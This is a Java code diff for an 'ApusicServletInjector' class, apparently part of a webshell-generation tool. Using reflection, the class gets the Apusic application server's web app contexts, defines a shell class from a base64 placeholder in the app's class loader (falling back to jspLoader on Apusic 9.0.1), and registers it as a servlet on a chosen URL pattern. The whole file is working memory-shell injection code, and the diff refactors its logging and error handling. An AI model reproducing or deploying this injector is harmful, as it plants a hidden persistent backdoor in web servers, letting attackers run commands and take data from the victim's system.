@@ -18,24 +18,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class ApusicServletInjector {
 
-    String msg = "";
-
-    public ApusicServletInjector() {
-        try {
-            List<Object> contexts = getContext();
-            msg += "contexts size: " + contexts.size() + "\n";
-            for (Object context : contexts) {
-                Object shell = getShell(context);
-                boolean inject = inject(context, shell);
-                msg += "context: " + getFieldValue(context, "contextRoot") +(inject ? " ok" : " already") + "\n";
-            }
-        } catch (Throwable e) {
-            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            PrintStream printStream = new PrintStream(outputStream);
-            e.printStackTrace(printStream);
-            msg += outputStream.toString();
-        }
-    }
+    private String msg = "";
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -47,6 +30,45 @@ public class ApusicServletInjector {
 
     public String getBase64String() throws IOException {
         return "{{base64Str}}";
+    }
+
+    public ApusicServletInjector() {
+        List<Object> contexts = null;
+        try {
+            contexts = getContext();
+        } catch (Throwable throwable) {
+            msg += "context error: " + getErrorMessage(throwable);
+        }
+        if (contexts != null) {
+            for (Object context : contexts) {
+                msg += ("context: [" + getContextRoot(context) + "] ");
+                try {
+                    Object shell = getShell(context);
+                    inject(context, shell);
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
+                }
+            }
+        }
+        System.out.println(msg);
+    }
+
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(context, "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
     }
 
     public List<Object> getContext() throws Exception {
@@ -68,20 +90,26 @@ public class ApusicServletInjector {
     }
 
     private Object getShell(Object context) throws Exception {
+        // WebApp 类加载器，ServletContext 使用这个进行组件的类加载
         ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
+        ClassLoader defineLoader;
+        Object obj;
         try {
+            // Apusic 9.0 SPX，优先从当前 loader 进行加载
             defineShell(loader);
-            Object obj = loader.loadClass(getClassName()).newInstance();
-            msg += loader + " loaded \n";
-            return obj;
+            // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
+            obj = loader.loadClass(getClassName()).newInstance();
+            defineLoader = loader;
         } catch (ClassNotFoundException e) {
-            // Apusic 9.0.1
+            // Apusic 9.0.1，委托给 jspLoader 进行加载，因此直接往 loader 里面 define 会 ClassNotFound
             ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
             defineShell(internalLoader);
-            Object obj = loader.loadClass(getClassName()).newInstance();
-            msg += internalLoader + " loaded \n";
-            return obj;
+            // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
+            obj = loader.loadClass(getClassName()).newInstance();
+            defineLoader = internalLoader;
         }
+        msg += "[" + defineLoader.getClass().getName() + "] ";
+        return obj;
     }
 
     @SuppressWarnings("all")
@@ -95,20 +123,19 @@ public class ApusicServletInjector {
         }
     }
 
-    public boolean inject(Object context, Object servlet) throws Exception {
+    public void inject(Object context, Object servlet) throws Exception {
         Object webModule = getFieldValue(context, "webapp");
         Object servletMapper = getFieldValue(context, "servletMapper");
         if (invokeMethod(webModule, "getServlet", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
-            return false;
+            return;
         }
         invokeMethod(webModule, "addServlet", new Class[]{String.class, String.class}, new Object[]{getClassName(), getClassName()});
         invokeMethod(servletMapper, "addMapping", new Class[]{String.class, boolean.class, String[].class}, new Object[]{getClassName(), true, new String[]{getUrlPattern()}});
-        return true;
     }
 
     @Override
     public String toString() {
-        return super.toString() + "\n" + msg;
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -190,6 +217,21 @@ public class ApusicServletInjector {
             return method.invoke(obj instanceof Class ? null : obj, param);
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
